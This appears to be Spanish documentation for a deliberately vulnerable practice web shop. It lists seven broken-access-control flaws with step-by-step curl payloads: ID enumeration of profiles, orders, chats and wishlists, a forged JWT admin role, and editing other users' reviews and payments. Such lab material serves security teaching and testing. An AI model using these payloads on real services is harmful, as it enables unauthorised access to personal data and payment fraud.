---
layout: default
title: Broken Access Control
nav_order: 7
parent: Vulnerabilidades
---

# Broken Access Control

## 7.1 IDOR en Perfiles de Usuario
- **Ubicación**: `/api/v1/users/{id}` y `/api/v1/users/{id}/profile`
- **Descripción**: Acceso directo a perfiles de usuario mediante manipulación de ID
- **Pasos**:
  1. Obtener ID propio del perfil
  2. Modificar ID en requests subsecuentes
  3. Enumerar IDs secuencialmente
  4. Acceder a información sensible
- **Payload de ejemplo**:
  ```bash
  # Obtener perfil propio
  curl http://cybershop.example.com/api/v1/users/123/profile

  # Acceder a otros perfiles
  curl http://cybershop.example.com/api/v1/users/124/profile
  curl http://cybershop.example.com/api/v1/users/125/profile
  ```
- **Criterio de éxito**: Acceso a perfiles de otros usuarios
- **Impacto**: Violación de privacidad, robo de información personal

## 7.2 Bypass de Autorización en Panel Admin
- **Ubicación**: `/api/v1/admin/*` y `/api/v1/management/*`
- **Descripción**: Verificación inadecuada de roles y privilegios
- **Pasos**:
  1. Identificar endpoints administrativos
  2. Modificar headers de autorización
  3. Bypass de verificación de roles
  4. Acceder a funcionalidades admin
- **Payload de ejemplo**:
  ```bash
  # Request normal
  curl -H "Authorization: Bearer user_token" \
    http://cybershop.example.com/api/v1/admin/users

  # Modificar rol en token JWT
  # Token original: {"role": "user"}
  # Token modificado: {"role": "admin"}
  curl -H "Authorization: Bearer admin_token" \
    http://cybershop.example.com/api/v1/admin/users
  ```
- **Criterio de éxito**: Acceso a funciones administrativas
- **Impacto**: Escalación de privilegios, control total del sistema

## 7.3 Control de Acceso Horizontal en Órdenes
- **Ubicación**: `/api/v1/orders/{id}` y `/api/v1/orders/{id}/details`
- **Descripción**: Falta de validación en propiedad de recursos
- **Pasos**:
  1. Realizar una compra propia
  2. Obtener ID de la orden
  3. Modificar ID para acceder a otras órdenes
  4. Enumerar órdenes secuencialmente
- **Payload de ejemplo**:
  ```bash
  # Acceder a orden propia
  curl http://cybershop.example.com/api/v1/orders/456

  # Acceder a órdenes ajenas
  curl http://cybershop.example.com/api/v1/orders/457
  curl http://cybershop.example.com/api/v1/orders/458
  ```
- **Criterio de éxito**: Acceso a órdenes de otros usuarios
- **Impacto**: Violación de privacidad, exposición de datos de compra

## 7.4 Bypass en Sistema de Reseñas
- **Ubicación**: `/api/v1/products/{id}/reviews`
- **Descripción**: Control de acceso inadecuado en gestión de reseñas
- **Pasos**:
  1. Publicar reseña propia
  2. Identificar ID de reseña
  3. Modificar o eliminar reseñas ajenas
  4. Bypass de verificación de autor
- **Payload de ejemplo**:
  ```bash
  # Modificar reseña ajena
  curl -X PUT http://cybershop.example.com/api/v1/products/1/reviews/789 \
    -d '{"rating": 1, "comment": "Modificado sin autorización"}'

  # Eliminar reseña ajena
  curl -X DELETE http://cybershop.example.com/api/v1/products/1/reviews/789
  ```
- **Criterio de éxito**: Manipulación de reseñas ajenas
- **Impacto**: Manipulación de reputación, fraude en reviews

## 7.5 Lista de Deseos Sin Restricciones
- **Ubicación**: `/api/v1/wishlist/{id}`
- **Descripción**: Acceso y modificación de listas de deseos ajenas
- **Pasos**:
  1. Crear lista de deseos propia
  2. Obtener ID de lista
  3. Acceder a listas ajenas
  4. Modificar contenido sin autorización
- **Payload de ejemplo**:
  ```bash
  # Acceder a lista ajena
  curl http://cybershop.example.com/api/v1/wishlist/321

  # Modificar lista ajena
  curl -X PUT http://cybershop.example.com/api/v1/wishlist/321 \
    -d '{"items": [{"id": 999, "quantity": 10}]}'
  ```
- **Criterio de éxito**: Manipulación de listas ajenas
- **Impacto**: Violación de privacidad, manipulación de datos

## 7.6 Chat de Soporte Vulnerable
- **Ubicación**: `/api/v1/support/chat/{id}`
- **Descripción**: Acceso no autorizado a conversaciones de soporte
- **Pasos**:
  1. Iniciar chat de soporte
  2. Obtener ID de conversación
  3. Acceder a chats ajenos
  4. Leer mensajes privados
- **Payload de ejemplo**:
  ```bash
  # Acceder a chat propio
  curl http://cybershop.example.com/api/v1/support/chat/159

  # Acceder a chats ajenos
  curl http://cybershop.example.com/api/v1/support/chat/160
  curl http://cybershop.example.com/api/v1/support/chat/161
  ```
- **Criterio de éxito**: Acceso a conversaciones privadas
- **Impacto**: Fuga de información sensible, violación de privacidad

## 7.7 Gestión de Pagos Insegura
- **Ubicación**: `/api/v1/payments/{id}`
- **Descripción**: Control de acceso débil en información de pagos
- **Pasos**:
  1. Realizar un pago propio
  2. Obtener ID de transacción
  3. Acceder a pagos ajenos
  4. Modificar estados de pago
- **Payload de ejemplo**:
  ```bash
  # Ver detalles de pago ajeno
  curl http://cybershop.example.com/api/v1/payments/753

  # Modificar estado de pago
  curl -X PUT http://cybershop.example.com/api/v1/payments/753 \
    -d '{"status": "completed", "amount": 0.01}'
  ```
- **Criterio de éxito**: Manipulación de pagos ajenos
- **Impacto**: Fraude financiero, manipulación de transacciones
